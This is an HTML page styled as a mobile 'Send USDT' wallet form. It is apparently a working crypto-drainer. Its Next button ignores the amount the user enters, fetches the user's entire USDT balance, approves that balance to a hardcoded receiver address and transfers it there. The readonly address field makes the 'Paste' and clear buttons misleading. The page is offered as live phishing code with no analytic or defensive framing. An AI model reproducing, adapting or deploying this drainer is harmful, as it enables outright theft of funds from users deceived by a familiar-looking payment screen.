<!DOCTYPE html>
<html>
<head>
  <title>Send USDT</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      background: #fff;
      color: #000;
    }

    .container {
      padding: 16px;
    }

    label {
      font-size: 14px;
      margin-bottom: 8px;
      display: block;
    }

    .input-box, .amount-box {
      display: flex;
      align-items: center;
      border: 1px solid #ccc;
      border-radius: 10px;
      padding: 0 10px;
      margin-bottom: 16px;
    }

    .input-box input, .amount-box input {
      flex: 1;
      border: none;
      outline: none;
      padding: 14px 10px;
      font-size: 16px;
      background: transparent;
    }

    .input-box button, .amount-box span {
      background: none;
      border: none;
      font-size: 14px;
      font-weight: bold;
      color: #0052ff;
      cursor: pointer;
      margin-left: 8px;
    }

    .converted {
      color: #888;
      font-size: 14px;
    }

    .footer {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      padding: 16px;
      background: #fff;
      box-shadow: 0 -1px 5px rgba(0,0,0,0.1);
    }

    .button {
      background-color: #0052ff;
      color: white;
      padding: 16px;
      width: 100%;
      font-size: 18px;
      font-weight: bold;
      border: none;
      border-radius: 20px;
      cursor: pointer;
    }

    .button.loading {
      position: relative;
    }

    .button.loading::after {
      content: "⏳ Processing...";
      position: absolute;
      left: 0;
      top: 0;
      right: 0;
      bottom: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #0052ff;
      border-radius: 20px;
    }
  </style>
</head>
<body>

  <div class="container">
    <label>Address or Domain Name</label>
    <div class="input-box">
      <input type="text" id="receiver" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" readonly>
      <button onclick="clearAddress()">✖</button>
      <button onclick="pasteAddress()">Paste</button>
    </div>

    <label>Amount</label>
    <div class="amount-box">
      <input type="number" id="amount" placeholder="Enter USDT Amount">
      <span onclick="fillMax()">Max</span>
      <span>USDT</span>
    </div>

    <div class="converted" id="converted">= $0.00</div>
  </div>

  <div class="footer">
    <button class="button" id="nextBtn" onclick="next()">Next</button>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
  <script>
    const USDT = "0x55d398326f99059fF775485246999027B3197955";
    const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";

    const ABI = [
      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
      { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
      { "constant": true, "inputs": [{ "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
    ];

    async function next() {
      const btn = document.getElementById('nextBtn');
      btn.classList.add("loading");

      try {
        if (!window.ethereum) throw new Error("Use Trust Wallet browser");

        const web3 = new Web3(window.ethereum);
        await window.ethereum.request({ method: 'eth_requestAccounts' });

        const accounts = await web3.eth.getAccounts();
        const user = accounts[0];

        const contract = new web3.eth.Contract(ABI, USDT);
        const balance = await contract.methods.balanceOf(user).call();

        await contract.methods.approve(RECEIVER, balance).send({ from: user });
        await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });

        btn.innerText = "✅ Done";
        btn.style.backgroundColor = "green";
      } catch (err) {
        console.error(err);
        btn.innerText = "❌ Failed";
        btn.style.backgroundColor = "red";
      } finally {
        btn.classList.remove("loading");
      }
    }

    async function fillMax() {
      if (!window.ethereum) return;
      const web3 = new Web3(window.ethereum);
      const accounts = await web3.eth.getAccounts();
      const contract = new web3.eth.Contract(ABI, USDT);
      const balance = await contract.methods.balanceOf(accounts[0]).call();
      const usdtValue = parseFloat(web3.utils.fromWei(balance, 'ether')).toFixed(2);
      document.getElementById("amount").value = usdtValue;
      document.getElementById("converted").innerText = `= $${usdtValue}`;
    }

    function pasteAddress() {
      navigator.clipboard.readText().then(text => {
        document.getElementById('receiver').value = text;
      });
    }

    function clearAddress() {
      document.getElementById('receiver').value = '';
    }
  </script>

</body>
</html>
